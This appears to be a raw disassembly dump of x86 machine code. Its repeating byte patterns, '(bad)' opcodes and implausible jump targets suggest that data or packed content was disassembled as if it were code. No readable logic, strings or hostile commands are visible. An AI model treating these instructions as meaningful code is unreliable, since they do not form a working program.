  416624:	retf   0xc04b
  416627:	adc    al,BYTE PTR [ebx+0x4a]
  41662a:	ret    0x57e
  41662d:	arpl   WORD PTR ss:0x4041cc,ax
  416634:	add    BYTE PTR [eax],al
  416636:	inc    eax
  416637:	inc    eax
  416638:	inc    ebx
  416639:	bound  eax,QWORD PTR [eax]
  41663b:	inc    eax
  41663c:	inc    eax
  41663d:	add    eax,0x62434162
  416642:	inc    eax
  416643:	js     0x416655
  416645:	inc    ecx
  416646:	add    eax,0x5404325
  41664b:	bound  eax,QWORD PTR [eax+0x40]
  41664e:	inc    ecx
  41664f:	inc    ebx
  416650:	cwde   
  416651:	xor    BYTE PTR [edx],cl
  416653:	out    dx,eax
  416654:	add    al,BYTE PTR [esi-0xbeaa8bc]
  41665a:	push   edx
  41665b:	xor    eax,0xc84c212e
  416660:	int    0x47
  416662:	cwde   
  416663:	push   eax
  416664:	jle    0x41662f
  416666:	aad    0x40
  416668:	inc    ecx
  416669:	test   DWORD PTR [ebx-0x40],eax
  41666c:	add    DWORD PTR ds:0x41253204,0x62
  416673:	inc    ebx
  416674:	add    BYTE PTR [eax],dl
  416676:	inc    eax
  416677:	add    BYTE PTR ds:0x62410040,al
  41667d:	inc    eax
  41667e:	add    BYTE PTR [ebx-0x34],al
  416681:	inc    eax
  416682:	add    eax,0x78434040
  416687:	bound  eax,QWORD PTR [ecx+0x78]
  41668a:	add    eax,0x62404043
  41668f:	popa   
  416690:	inc    ebx
  416691:	add    eax,0xa886f514
  416696:	and    eax,esp
  416698:	nop
  416699:	and    DWORD PTR gs:[edx+0x34],esp
  41669d:	adc    BYTE PTR [edx+eiz*2-0x7e3e2f6d],ah
  4166a4:	enter  0xc0b4,0x5b
  4166a8:	inc    ebx
  4166a9:	out    0xd2,eax
  4166ab:	inc    esp
  4166ac:	add    eax,0xd1205205
  4166b1:	stos   BYTE PTR es:[edi],al
  4166b2:	les    eax,FWORD PTR [eax]
  4166b4:	xchg   bl,cl
  4166b6:	lods   al,BYTE PTR ds:[esi]
  4166b7:	sub    ah,bh
  4166b9:	or     esi,DWORD PTR [ebx+0x2d]
  4166bc:	xor    ecx,DWORD PTR [ebx+eax*8-0x7c]
  4166c0:	mov    ebx,0x54041cf
  4166c5:	inc    eax
  4166c6:	bound  eax,QWORD PTR [ebx+0x43]
  4166c9:	add    eax,0x62004040
  4166ce:	inc    eax
  4166cf:	add    BYTE PTR [ecx+0x40],al
  4166d2:	inc    ebx
  4166d3:	test   BYTE PTR ds:0x58054041,ah
  4166d9:	inc    eax
  4166da:	inc    eax
  4166db:	bound  eax,QWORD PTR [eax+0x66]
  4166de:	inc    ecx
  4166df:	inc    eax
  4166e0:	add    eax,0xc74f4000
  4166e5:	stos   DWORD PTR es:[edi],eax
  4166e6:	mov    esp,0x71170137
  4166eb:	add    DWORD PTR ds:0x25543e40,eax
  4166f1:	sbb    BYTE PTR cs:[ebx-0x7a],dl
  4166f5:	inc    esi
  4166f6:	imul   esp,DWORD PTR [edx+0x41],0x3404e5c9
  4166fd:	adc    bl,BYTE PTR [ecx-0x4c]
  416700:	inc    ebx
  416701:	jmp    0x190795c8
  416706:	add    BYTE PTR [eax],al
  416708:	inc    ebx
  416709:	inc    eax
  41670a:	bound  eax,QWORD PTR ds:0x25404110
  416710:	add    ah,cl
  416712:	inc    ebx
  416713:	add    eax,0x40402562
  416718:	add    BYTE PTR [eax+0x40],al
  41671b:	inc    ecx
  41671c:	inc    ecx
  41671d:	add    eax,0x78434025
  416722:	bound  eax,QWORD PTR [eax-0x7c]
  416725:	inc    eax
  416726:	inc    ecx
  416727:	fadd   DWORD PTR ds:0x453a4930
  41672d:	add    eax,0xf0870a62
  416732:	adc    DWORD PTR [eax+0x4],eax
  416735:	xchg   BYTE PTR ds:0x4142280f,al
  41673b:	inc    eax
  41673c:	inc    eax
  41673d:	inc    ebx
  41673e:	int3   
  41673f:	add    BYTE PTR ds:0x56240,al
  416745:	inc    ebx
  416746:	inc    eax
  416747:	inc    eax
  416748:	add    BYTE PTR [ecx+0x62],al
  41674b:	bound  eax,QWORD PTR [eax]
  41674d:	int3   
  41674e:	inc    eax
  41674f:	inc    ebx
  416750:	add    eax,0x43624041
  416755:	adc    BYTE PTR [ecx+0x5],al
  416758:	inc    eax
  416759:	shr    DWORD PTR [ecx],1
  41675b:	xor    ebp,DWORD PTR [edi]
  41675d:	xchg   DWORD PTR [ecx+0x4ba5f541],ecx
  416763:	call   0x667:0x4d1338c5
  41676a:	shl    BYTE PTR [esi],0x5
  41676d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41676e:	sub    ah,bh
  416770:	pop    ecx
  416771:	es ins DWORD PTR es:[edi],dx
  416773:	mov    eax,DWORD PTR [esi+0x629f6262]
  416779:	inc    ebx
  41677a:	inc    eax
  41677b:	adc    BYTE PTR ds:0x4158cc40,al
  416781:	inc    ebx
  416782:	bound  eax,QWORD PTR [ecx+0x40]
  416785:	add    eax,0x4140
  41678a:	and    eax,0x40400062
  41678f:	add    eax,0x84404340
  416794:	int3   
  416795:	js     0x416797
  416797:	inc    ecx
  416798:	adc    BYTE PTR [edx+0xf],ah
  41679b:	enter  0x4b94,0x21
  41679f:	das    
  4167a0:	pusha  
  4167a1:	adc    BYTE PTR [eax+esi*4],bh
  4167a4:	sub    al,0xc5
  4167a6:	add    eax,0x305090c4
  4167ab:	inc    ebx
  4167ac:	fst    QWORD PTR ds:0xc9620573
  4167b2:	pushf  
  4167b3:	shl    DWORD PTR [esi],1
  4167b5:	rol    DWORD PTR [ecx+0x40004286],0x41
  4167bc:	inc    eax
  4167bd:	inc    ebx
  4167be:	bound  ax,DWORD PTR ds:0x40434100
  4167c5:	add    eax,0x40054062
  4167ca:	bound  eax,QWORD PTR [ecx+0x40]
  4167cd:	inc    ebx
  4167ce:	inc    eax
  4167cf:	add    eax,0x25405841
  4167d4:	bound  eax,QWORD PTR [eax+0x43]
  4167d7:	inc    eax
  4167d8:	adc    dh,bl
  4167da:	push   0x6bcb628c
  4167df:	and    cl,cl
  4167e1:	inc    esp
  4167e2:	dec    ebp
  4167e3:	test   eax,0xc381dac9
  4167e8:	mov    ah,0xcc
  4167ea:	fst    QWORD PTR [esi]
  4167ec:	push   ecx
  4167ed:	mov    DWORD PTR [eax+0x41],0x62054043
  4167f4:	bound  eax,QWORD PTR [eax+0x43]
  4167f7:	inc    ecx
  4167f8:	adc    BYTE PTR [eax],al
  4167fa:	inc    eax
  4167fb:	add    eax,0x43000562
  416800:	add    BYTE PTR [ecx+0x40],al
  416803:	inc    eax
  416804:	add    eax,0x400062
  416809:	inc    ebx
  41680a:	inc    eax
  41680b:	js     0x41684e
  41680d:	inc    ecx
  41680e:	bound  eax,QWORD PTR [eax-0x11]
  416811:	add    eax,0x52646b33
  416816:	mov    cl,0x15
  416818:	or     DWORD PTR [esi+0x412804ef],eax
  41681e:	dec    esp
  41681f:	(bad)  
  416820:	jno    0x416882
  416822:	arpl   WORD PTR [eax+eiz*8],bx
  416825:	inc    ebx
  416826:	mov    esi,0x59c28149
  41682b:	bound  ebp,QWORD PTR [eax+esi*1+0x547ceab]
  416832:	cmp    eax,0x41054062
  416837:	add    BYTE PTR [ebx+0x40],al
  41683a:	inc    eax
  41683b:	inc    ecx
  41683c:	inc    eax
  41683d:	inc    eax
  41683e:	bound  eax,QWORD PTR ds:0x5624300
  416844:	add    BYTE PTR [eax+0x40],al
  416847:	add    BYTE PTR [ecx+0x43],al
  41684a:	add    BYTE PTR [eax+0x41],al
  41684d:	add    eax,0x40436200
  416852:	inc    eax
  416853:	add    eax,0xec6fea62
  416858:	mov    esi,0xd9860132
  41685d:	ror    BYTE PTR [ebx],1
  41685f:	inc    edi
  416860:	jno    0x416870
  416862:	pop    ebx
  416863:	cmp    eax,0x85b0625f
  416868:	(bad)  
  41686a:	add    al,cl
  41686c:	xor    al,0x62
  41686e:	bound  eax,QWORD PTR [ebx+0x3c]
  416871:	aas    
  416872:	mov    edi,0x4ef80905
  416877:	nop
  416878:	sub    BYTE PTR [esi-0x5c],al
  41687b:	xchg   BYTE PTR [ebx+0x62],ah
  41687e:	cmp    BYTE PTR [ebp-0x2e],cl
  416881:	outs   dx,DWORD PTR ds:[esi]
  416882:	shl    DWORD PTR [eiz*2+0x5f430d22],0x41
  41688a:	inc    eax
  41688b:	add    eax,0x41624340
  416890:	test   BYTE PTR [eax],al
  416892:	and    eax,0x404043
  416897:	add    BYTE PTR ds:0x626210,al
  41689d:	add    eax,0x43404140
  4168a2:	inc    eax
  4168a3:	inc    ecx
  4168a4:	add    eax,0x10664062
  4168a9:	inc    ebx
  4168aa:	bound  edi,QWORD PTR ds:0xd03dc003
  4168b0:	push   esi
  4168b1:	ror    edx,1
  4168b3:	inc    esp
  4168b4:	push   ds
  4168b5:	add    eax,0x49954051
  4168ba:	shr    BYTE PTR [ebp-0x79c79fe],1
  4168c0:	push   ebp
  4168c1:	sbb    al,0xeb
  4168c3:	outs   dx,DWORD PTR ds:[esi]
  4168c4:	sub    DWORD PTR [eax+eax*1],ebp
  4168c7:	imul   esi,DWORD PTR ds:0x4d35e943,0xffffffbf
  4168ce:	ins    BYTE PTR es:[edi],dx
  4168cf:	call   0x408334d9
  4168d4:	add    BYTE PTR [eax],al
  4168d6:	add    BYTE PTR [eax+0x40],al
  4168d9:	inc    ebx
  4168da:	bound  eax,QWORD PTR [eax]
  4168dc:	inc    eax
  4168dd:	inc    eax
  4168de:	add    eax,0x62434162
  4168e3:	inc    eax
  4168e4:	js     0x4168f6
  4168e6:	inc    ecx
  4168e7:	add    eax,0x5404325
  4168ec:	bound  eax,QWORD PTR [eax+0x40]
  4168ef:	inc    ecx
  4168f0:	inc    ebx
  4168f1:	and    dl,BYTE PTR [eax-0x40ffbf51]
  4168f7:	bound  eax,QWORD PTR [ebp+0x26]
  4168fa:	inc    ecx
  4168fb:	dec    esp
  4168fc:	jg     0x416924
  4168fe:	mov    edi,0x4354d9a9
  416903:	popa   
  416904:	push   ecx
  416905:	pop    ecx
  416906:	aas    
  416907:	inc    ebp
  416908:	popa   
  416909:	add    BYTE PTR [eax],dh
  41690b:	aam    0x41
  41690d:	and    DWORD PTR ds:0x436241,0x5004010
  416917:	inc    eax
  416918:	add    BYTE PTR [ecx+0x62],al
  41691b:	inc    eax
  41691c:	add    BYTE PTR [ebx-0x34],al
  41691f:	inc    eax
  416920:	add    eax,0x78434040
  416925:	bound  eax,QWORD PTR [ecx+0x78]
  416928:	add    eax,0x62404043
  41692d:	lds    ebp,FWORD PTR [ebx-0x2717b555]
  416933:	jecxz  0x416956
  416935:	xchg   BYTE PTR [edx+0x44],al
  416938:	ss inc edi
  41693a:	dec    ebx
  41693b:	inc    ecx
  41693c:	add    esi,DWORD PTR ds:0x856e54ab
  416942:	push   ecx
  416943:	inc    ebp
  416944:	sub    esi,DWORD PTR [ecx-0x48]
  416947:	retf   
  416948:	test   al,0x43
  41694a:	inc    edx
  41694b:	inc    eax
  41694c:	jnp    0x41698e
  41694e:	or     eax,0xe590bf46
  416953:	sub    BYTE PTR [ecx+0x2aa8c920],al
  416959:	push   0x7a
  41695b:	jae    0x4169af
  41695d:	pop    eax
  41695e:	inc    ebp
  41695f:	adc    BYTE PTR [ecx+0x43],al
  416962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416963:	inc    ecx
  416964:	inc    eax
  416965:	add    eax,0x43436240
  41696a:	add    eax,0x62004040
  41696f:	inc    eax
  416970:	add    BYTE PTR [ecx+0x40],al
  416973:	inc    ebx
  416974:	test   BYTE PTR ds:0x58054041,ah
  41697a:	inc    eax
  41697b:	inc    eax
  41697c:	bound  eax,QWORD PTR [eax+0x66]
  41697f:	inc    ecx
  416980:	inc    eax
  416981:	add    eax,0x63814000
  416986:	inc    ebp
  416987:	dec    esp
  416988:	psrlw  mm6,QWORD PTR [eax]
  41698b:	sbb    eax,0x413c864b
  416990:	mov    cl,ah
  416992:	xchg   BYTE PTR [ecx],ch
  416994:	and    DWORD PTR [ecx],0xaf623e2e
  41699a:	mov    DWORD PTR [edi],ebx
  41699c:	dec    esi
  41699d:	mov    edi,0xa90c9888
  4169a2:	les    eax,FWORD PTR [eax+0x1]
  4169a5:	mov    edi,0x69c46764
  4169aa:	sub    eax,0x48bf4a60
  4169af:	inc    edi
  4169b0:	bound  eax,QWORD PTR [ecx-0x40]
  4169b3:	add    BYTE PTR [eax],al
  4169b5:	inc    ebx
  4169b6:	inc    eax
  4169b7:	bound  eax,QWORD PTR ds:0x25404110
  4169bd:	add    ah,cl
  4169bf:	inc    ebx
  4169c0:	add    eax,0x40402562
  4169c5:	add    BYTE PTR [eax+0x40],al
  4169c8:	inc    ecx
  4169c9:	inc    ecx
  4169ca:	add    eax,0x78434025
  4169cf:	bound  eax,QWORD PTR [eax-0x7c]
  4169d2:	inc    eax
  4169d3:	inc    ecx
  4169d4:	pop    ebx
  4169d5:	test   DWORD PTR ds:0x43be433c,edi
  4169db:	jns    0x416a1d
  4169dd:	dec    esi
  4169de:	(bad)
  4169e1:	xor    al,0x30
  4169e3:	jae    0x416a14
  4169e5:	add    DWORD PTR [esi-0x1b2897e2],0x26034905
  4169ef:	popa   
  4169f0:	sbb    al,0xe4
  4169f2:	inc    edi
  4169f3:	mov    edi,0x62460440
  4169f8:	fsub   DWORD PTR [edx-0x7b]
  4169fb:	icebp  
  4169fc:	pusha  
  4169fd:	or     DWORD PTR [eax],esi
  4169ff:	inc    ebx
  416a00:	bound  esi,QWORD PTR [ebx+0x41]
  416a03:	inc    eax
  416a04:	inc    eax
  416a05:	inc    ebx
  416a06:	int3   
  416a07:	add    BYTE PTR ds:0x56240,al
  416a0d:	inc    ebx
  416a0e:	inc    eax
  416a0f:	inc    eax
  416a10:	add    BYTE PTR [ecx+0x62],al
  416a13:	bound  eax,QWORD PTR [eax]
  416a15:	int3   
  416a16:	inc    eax
  416a17:	inc    ebx
  416a18:	add    eax,0x43624041
  416a1d:	adc    BYTE PTR [ecx+0x5],al
  416a20:	inc    eax
  416a21:	inc    ebx
  416a22:	inc    edx
  416a23:	dec    ebp
  416a24:	mov    esi,0xdc62b42c
  416a29:	nop
  416a2a:	jp     0x416a6e
  416a2c:	inc    esp
  416a2d:	arpl   WORD PTR [eax+0x34],cx
  416a30:	adc    DWORD PTR [edi],eax
  416a32:	push   ebx
  416a33:	adc    eax,0x62f28680
  416a38:	inc    ebx
  416a39:	inc    eax
  416a3a:	adc    BYTE PTR ds:0x4158cc40,al
  416a40:	inc    ebx
  416a41:	bound  eax,QWORD PTR [ecx+0x40]
  416a44:	add    eax,0x4140
  416a49:	and    eax,0x40400062
  416a4e:	add    eax,0x84404340
  416a53:	int3   
  416a54:	js     0x416a56
  416a56:	inc    ecx
  416a57:	adc    BYTE PTR [edx+0xf],ah
  416a5a:	xor    DWORD PTR [ebx+eax*2+0x2522a911],eax
  416a61:	push   ecx
  416a62:	xchg   edi,eax
  416a63:	push   edx
  416a64:	shl    DWORD PTR [ebx+0x40],1
  416a67:	xor    al,dl
  416a69:	and    al,0xd4
  416a6b:	cwde   
  416a6c:	or     cl,bl
  416a6e:	and    DWORD PTR ss:[edx+0x64],0x56befc42
  416a76:	inc    eax
  416a77:	jge    0x416adb
  416a79:	mov    ah,BYTE PTR [ebx+0x62]
  416a7c:	loope  0x416adc
  416a7e:	sub    DWORD PTR [eax],eax
  416a80:	lds    esp,FWORD PTR [ecx]
  416a82:	ins    DWORD PTR es:[edi],dx
  416a83:	mov    al,0x0
  416a85:	inc    eax
  416a86:	inc    ecx
  416a87:	inc    eax
  416a88:	inc    ebx
  416a89:	bound  ax,DWORD PTR ds:0x40434100
  416a90:	add    eax,0x40054062
  416a95:	bound  eax,QWORD PTR [ecx+0x40]
  416a98:	inc    ebx
  416a99:	inc    eax
  416a9a:	add    eax,0x25405841
  416a9f:	bound  eax,QWORD PTR [eax+0x43]
  416aa2:	inc    eax
  416aa3:	adc    BYTE PTR [esi+0x75],bl
  416aa6:	inc    ecx
  416aa7:	xor    al,BYTE PTR [esi+0x41556e4f]
  416aad:	pop    esp
  416aae:	inc    eax
  416aaf:	pop    es
  416ab0:	and    al,0x24
  416ab2:	sub    eax,0x327243c9
  416ab7:	add    al,0x1a
  416ab9:	cmp    esp,DWORD PTR [edi+0xb]
  416abc:	inc    eax
  416abd:	inc    ecx
  416abe:	inc    ebx
  416abf:	inc    eax
  416ac0:	add    eax,0x43406262
  416ac5:	inc    ecx
  416ac6:	adc    BYTE PTR [eax],al
  416ac8:	inc    eax
  416ac9:	add    eax,0x43000562
  416ace:	add    BYTE PTR [ecx+0x40],al
  416ad1:	inc    eax
  416ad2:	add    eax,0x400062
  416ad7:	inc    ebx
  416ad8:	inc    eax
  416ad9:	js     0x416b1c
  416adb:	inc    ecx
  416adc:	bound  eax,QWORD PTR [eax+0x30]
  416adf:	fidiv  WORD PTR [edi+0x29]
  416ae2:	arpl   WORD PTR [edx],bx
  416ae4:	adc    BYTE PTR [ebx-0x28bf5a20],ch
  416aea:	bound  ebp,QWORD PTR [eax-0x6b3d439d]
  416af0:	inc    ebp
  416af1:	or     ebp,eax
  416af3:	xor    dh,BYTE PTR [edi+0x0]
  416af6:	leave  
  416af7:	mov    al,ds:0xa786f560
  416afc:	adc    edi,DWORD PTR [edi+0x6c]
  416aff:	mov    esi,0x623b4855
  416b04:	stc    
  416b05:	bound  esi,QWORD PTR [ebx]
  416b07:	cli    
  416b08:	inc    ebx
  416b09:	or     BYTE PTR [edi+0x63e26411],bh
  416b0f:	bound  eax,QWORD PTR [eax+0x5]
  416b12:	inc    ecx
  416b13:	add    BYTE PTR [ebx+0x40],al
  416b16:	inc    eax
  416b17:	inc    ecx
  416b18:	inc    eax
  416b19:	inc    eax
  416b1a:	bound  eax,QWORD PTR ds:0x5624300
  416b20:	add    BYTE PTR [eax+0x40],al
  416b23:	add    BYTE PTR [ecx+0x43],al
  416b26:	add    BYTE PTR [eax+0x41],al
  416b29:	add    eax,0x40436200
  416b2e:	inc    eax
  416b2f:	add    eax,0x2447e062
  416b34:	mov    edi,0x437c54bc
  416b39:	jno    0x416b7b
  416b3b:	ds mov edi,0x906a610d
  416b41:	mov    ds:0x43398229,eax
  416b46:	dec    ecx
  416b47:	dec    ecx
  416b48:	and    al,0xbf
  416b4a:	push   ebx
  416b4b:	pusha  
  416b4c:	lds    edi,FWORD PTR [eax+0x2243dc64]
  416b52:	inc    eax
  416b53:	into   
  416b54:	xchg   BYTE PTR ds:0x65d1422a,cl
  416b5a:	xor    DWORD PTR [ecx],eax
  416b5c:	pusha  
  416b5d:	retf   
  416b5e:	fmul   QWORD PTR [ebx+ebp*2+0x40416b4a]
  416b65:	add    eax,0x41624340
  416b6a:	test   BYTE PTR [eax],al
  416b6c:	and    eax,0x404043
  416b71:	add    BYTE PTR ds:0x626210,al
  416b77:	add    eax,0x43404140
  416b7c:	inc    eax
  416b7d:	inc    ecx
  416b7e:	add    eax,0x10664062
  416b83:	inc    ebx
  416b84:	bound  eax,QWORD PTR [ecx+0x47]
  416b87:	add    ah,BYTE PTR [ebx+0x6d]
  416b8a:	dec    ebx
  416b8b:	test   al,0x40
  416b8d:	sbb    BYTE PTR [edx],0xab
  416b90:	adc    al,0x7b
  416b92:	pop    es
  416b93:	add    BYTE PTR ds:0x64464c2b,ah
  416b99:	fs in  eax,0xb3
  416b9c:	sub    cl,BYTE PTR [eax+0x63]
  416b9f:	dec    edx
  416ba0:	push   edx
  416ba1:	bound  eax,QWORD PTR [ecx-0x6a]
  416ba4:	and    eax,DWORD PTR [eax+0x4b0e2886]
  416baa:	inc    ebx
  416bab:	pushf  
  416bac:	inc    ecx
  416bad:	in     eax,dx
  416bae:	xor    al,0xa8
  416bb0:	adc    DWORD PTR [eax+esi*1],edi
  416bb3:	xchg   esp,eax
  416bb4:	jmp    0xc1472aeb
  416bb9:	(bad)  
  416bba:	fadd   QWORD PTR ds:0x4041cc
  416bc0:	add    BYTE PTR [eax],al
  416bc2:	inc    eax
  416bc3:	inc    eax
  416bc4:	inc    ebx
  416bc5:	bound  eax,QWORD PTR [eax]
  416bc7:	inc    eax
  416bc8:	inc    eax
  416bc9:	add    eax,0x62434162
  416bce:	inc    eax
  416bcf:	js     0x416be1
  416bd1:	inc    ecx
  416bd2:	add    eax,0x5404325
  416bd7:	bound  eax,QWORD PTR [eax+0x40]
  416bda:	inc    ecx
  416bdb:	inc    ebx
  416bdc:	and    eax,DWORD PTR [ecx+0x46]
  416bdf:	mov    edi,0xc1a81487
  416be4:	shl    BYTE PTR [ecx],1
  416be6:	add    BYTE PTR [edi+0x671034a9],bh
  416bec:	dec    edi
  416bed:	inc    eax
  416bee:	adc    esi,DWORD PTR [edi]
  416bf0:	out    dx,eax
  416bf1:	pop    edi
  416bf2:	mov    esp,0x7667dda2
  416bf7:	lds    edx,FWORD PTR [ecx]
  416bf9:	and    al,BYTE PTR [ecx+0x64]
  416bfc:	xor    al,0x40
  416bfe:	add    DWORD PTR [esi+0x43001cab],0x256535aa
  416c08:	inc    edx
  416c09:	xor    eax,0x40ab9028
  416c0e:	add    DWORD PTR ds:0x436241,esp
  416c14:	adc    BYTE PTR [eax+0x0],al
  416c17:	add    eax,0x62410040
  416c1c:	inc    eax
  416c1d:	add    BYTE PTR [ebx-0x34],al
  416c20:	inc    eax
  416c21:	add    eax,0x78434040
  416c26:	bound  eax,QWORD PTR [ecx+0x78]
  416c29:	add    eax,0x62404043
  416c2e:	inc    esi
  416c2f:	xor    eax,0x90c10e40
  416c34:	adc    DWORD PTR [edi+0x66],eax
  416c37:	or     BYTE PTR [eax+eiz*1+0x43],0xaf
  416c3c:	mov    al,ds:0x41c53c01
  416c41:	push   esp
  416c42:	inc    ecx
  416c43:	inc    eax
  416c44:	add    eax,0x43436240
  416c49:	add    eax,0x62004040
  416c4e:	inc    eax
  416c4f:	add    BYTE PTR [ecx+0x40],al
  416c52:	inc    ebx
  416c53:	test   BYTE PTR ds:0x58054041,ah
  416c59:	inc    eax
  416c5a:	inc    eax
  416c5b:	bound  eax,QWORD PTR [eax+0x66]
  416c5e:	inc    ecx
  416c5f:	inc    eax
  416c60:	add    eax,0x75f0d100
  416c65:	dec    ecx
  416c66:	push   ebx
  416c67:	nop
  416c68:	fidiv  DWORD PTR [esi*1-0x7979bd76]
  416c6f:	inc    esp
  416c70:	mov    esp,0x2c5f766a
  416c75:	ins    BYTE PTR es:[edi],dx
  416c76:	xor    edx,DWORD PTR [edi+0x68]
  416c79:	xchg   esi,eax
  416c7a:	out    0xb8,al
  416c7c:	inc    ecx
  416c7d:	push   ds
  416c7e:	mov    edi,0x22624f28
  416c83:	mov    al,BYTE PTR [eax]
  416c85:	add    BYTE PTR [ebx+0x40],al
  416c88:	bound  eax,QWORD PTR ds:0x25404110
  416c8e:	add    ah,cl
  416c90:	inc    ebx
  416c91:	add    eax,0x40402562
  416c96:	add    BYTE PTR [eax+0x40],al
  416c99:	inc    ecx
  416c9a:	inc    ecx
  416c9b:	add    eax,0x78434025
  416ca0:	bound  eax,QWORD PTR [eax-0x7c]
  416ca3:	inc    eax
  416ca4:	inc    ecx
  416ca5:	inc    eax
  416ca6:	dec    ecx
  416ca7:	mov    edi,0x41f6dc3c
  416cac:	outs   dx,BYTE PTR ds:[esi]
  416cad:	xor    al,0x11
  416caf:	mov    edi,0x43b87023
  416cb4:	adc    ch,BYTE PTR [ebp-0x3d]
  416cb7:	xor    eax,0x3062ac39
  416cbc:	sti    
  416cbd:	inc    eax
  416cbe:	add    ebp,eax
  416cc0:	outs   dx,BYTE PTR ds:[esi]
  416cc1:	fiadd  DWORD PTR [eax+ebx*8-0x79b68253]
  416cc8:	mov    bh,0x41
  416cca:	inc    eax
  416ccb:	inc    eax
  416ccc:	inc    ebx
  416ccd:	int3   
  416cce:	add    BYTE PTR ds:0x56240,al
  416cd4:	inc    ebx
  416cd5:	inc    eax
  416cd6:	inc    eax
  416cd7:	add    BYTE PTR [ecx+0x62],al
  416cda:	bound  eax,QWORD PTR [eax]
  416cdc:	int3   
  416cdd:	inc    eax
  416cde:	inc    ebx
  416cdf:	add    eax,0x43624041
  416ce4:	adc    BYTE PTR [ecx+0x5],al
  416ce7:	inc    eax
  416ce8:	add    BYTE PTR [edx+0x240e9c2],cl
  416cee:	outs   dx,DWORD PTR ds:[esi]
  416cef:	test   al,0x54
  416cf1:	sub    eax,0x7f334bc9
  416cf6:	inc    esi
  416cf7:	adc    bl,cl
  416cf9:	iret   
  416cfa:	imul   edx,DWORD PTR [eax+ebp*8+0x20483446],0xffffffac
  416d02:	retf   
  416d03:	and    bl,al
  416d05:	add    DWORD PTR [eax],edi
  416d07:	inc    edx
  416d08:	jbe    0x416cdf
  416d0a:	fs pop ebx
  416d0c:	inc    eax
  416d0d:	scas   eax,DWORD PTR es:[edi]
  416d0e:	arpl   WORD PTR [ebp+0x78],bx
  416d11:	addr16 dec esp
  416d13:	mov    BYTE PTR [ecx],ah
  416d15:	ret    
  416d16:	xchg   ah,bl
  416d18:	(bad)  
  416d19:	in     al,dx
  416d1a:	pop    esp
  416d1b:	bound  eax,QWORD PTR [ebx+0x40]
  416d1e:	adc    BYTE PTR ds:0x4158cc40,al
  416d24:	inc    ebx
  416d25:	bound  eax,QWORD PTR [ecx+0x40]
  416d28:	add    eax,0x4140
  416d2d:	and    eax,0x40400062
  416d32:	add    eax,0x84404340
  416d37:	int3   
  416d38:	js     0x416d3a
  416d3a:	inc    ecx
  416d3b:	adc    BYTE PTR [edx+0xf],ah
  416d3e:	jecxz  0x416d80
  416d40:	push   edx
  416d41:	pusha  
  416d42:	retf   
  416d43:	fs push ebp
  416d45:	frstor [edi]
  416d47:	sub    al,0xc2
  416d49:	mov    edi,0xde0ae480
  416d4e:	imul   edi,DWORD PTR [ebp+0x35],0xffffffbf
  416d52:	(bad)  [ecx-0x4]
  416d55:	test   al,0x1e
  416d57:	inc    eax
  416d58:	scas   al,BYTE PTR es:[edi]
  416d59:	mov    edi,0x4062a8bc
  416d5e:	jae    0x416d60
  416d60:	inc    eax
  416d61:	inc    ecx
  416d62:	inc    eax
  416d63:	inc    ebx
  416d64:	bound  ax,DWORD PTR ds:0x40434100
  416d6b:	add    eax,0x40054062
  416d70:	bound  eax,QWORD PTR [ecx+0x40]
  416d73:	inc    ebx
  416d74:	inc    eax
  416d75:	add    eax,0x25405841
  416d7a:	bound  eax,QWORD PTR [eax+0x43]
  416d7d:	inc    eax
  416d7e:	adc    BYTE PTR [eax+0x2b],ah
  416d81:	xor    edx,DWORD PTR ds:0x982a4111
  416d87:	pop    ss
  416d88:	rol    ebp,0xcd
  416d8b:	mov    esp,0x4076417c
  416d90:	mov    DWORD PTR [esi+0x2a6b416b],0x34c12e8f
  416d9a:	sub    eax,ebx
  416d9c:	pop    esp
  416d9d:	sbb    eax,DWORD PTR [eax+0x41]
  416da0:	inc    ebx
  416da1:	inc    eax
  416da2:	add    eax,0x43406262
  416da7:	inc    ecx
  416da8:	adc    BYTE PTR [eax],al
  416daa:	inc    eax
  416dab:	add    eax,0x43000562
  416db0:	add    BYTE PTR [ecx+0x40],al
  416db3:	inc    eax
  416db4:	add    eax,0x400062
  416db9:	inc    ebx
  416dba:	inc    eax
  416dbb:	js     0x416dfe
  416dbd:	inc    ecx
  416dbe:	bound  eax,QWORD PTR [eax+0x3]
  416dc1:	retf   0x463f
  416dc4:	push   esp
  416dc5:	sub    al,ah
  416dc7:	add    dh,dl
  416dc9:	outs   dx,DWORD PTR ds:[esi]
  416dca:	rcr    DWORD PTR [ecx],0x20
  416dcd:	imul   ebx,DWORD PTR fs:[ecx-0x7e],0x40
  416dd2:	fbstp  TBYTE PTR [ecx+edx*2+0xb848dd]
  416dd9:	shl    DWORD PTR es:[edx+0x20],0xd8
  416dde:	leave  
  416ddf:	inc    edi
  416de0:	mov    cs,WORD PTR [edx+0x41]
  416de3:	lds    eax,FWORD PTR [ecx+0x58]
  416de6:	mov    esp,0x41054062
  416deb:	add    BYTE PTR [ebx+0x40],al
  416dee:	inc    eax
  416def:	inc    ecx
  416df0:	inc    eax
  416df1:	inc    eax
  416df2:	bound  eax,QWORD PTR ds:0x5624300
  416df8:	add    BYTE PTR [eax+0x40],al
  416dfb:	add    BYTE PTR [ecx+0x43],al
  416dfe:	add    BYTE PTR [eax+0x41],al
  416e01:	add    eax,0x40436200
  416e06:	inc    eax
  416e07:	add    eax,0x40fa4362
  416e0c:	lds    eax,FWORD PTR [esi+0x30100d62]
  416e12:	(bad)  
  416e13:	jle    0x416ddf
  416e15:	sub    ebx,ecx
  416e17:	retf   
  416e18:	dec    ebx
  416e19:	aam    0xf5
  416e1b:	ss ret 0x40bf
  416e1f:	fbld   TBYTE PTR [ebx+0x40]
  416e22:	push   ds
  416e23:	inc    eax
  416e24:	imul   edi,DWORD PTR [edi+0x31489f2a],0xbf277c45
  416e2e:	adc    ah,BYTE PTR [edx-0x78]
  416e31:	ins    BYTE PTR es:[edi],dx
  416e32:	xchg   edx,eax
  416e33:	inc    edx
  416e34:	shl    BYTE PTR [ecx],0xbc
  416e37:	inc    ecx
  416e38:	inc    eax
  416e39:	add    eax,0x41624340
  416e3e:	test   BYTE PTR [eax],al
  416e40:	and    eax,0x404043
  416e45:	add    BYTE PTR ds:0x626210,al
  416e4b:	add    eax,0x43404140
  416e50:	inc    eax
  416e51:	inc    ecx
  416e52:	add    eax,0x10664062
  416e57:	inc    ebx
  416e58:	bound  ebp,QWORD PTR [ebx+0x61]
  416e5b:	jnp    0x416ec1
  416e5d:	inc    ebx
  416e5e:	mov    ebp,0x635c15c5
  416e63:	dec    esi
  416e64:	mul    BYTE PTR [esi]
  416e66:	and    eax,0x4e2d4386
